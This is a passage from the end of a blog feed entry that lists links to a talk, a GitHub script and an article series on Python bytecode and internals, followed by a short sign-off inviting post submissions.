<li><a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8">Bytecode: What, Why, and How to Hack it &ndash; Dr. Ryan F Kelly</a></li>
<li><a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">Self-modifying Python bytecode</a></li>
<li><a href="http://eli.thegreenplace.net/category/programming/python/python-internals/">Python internals series</a></li>
</ul>


<p>Folks, that&rsquo;s all for today ; don&rsquo;t hesitate to contact us if you have a cool post!</p>
]]></content>
  </entry>
  
</feed>
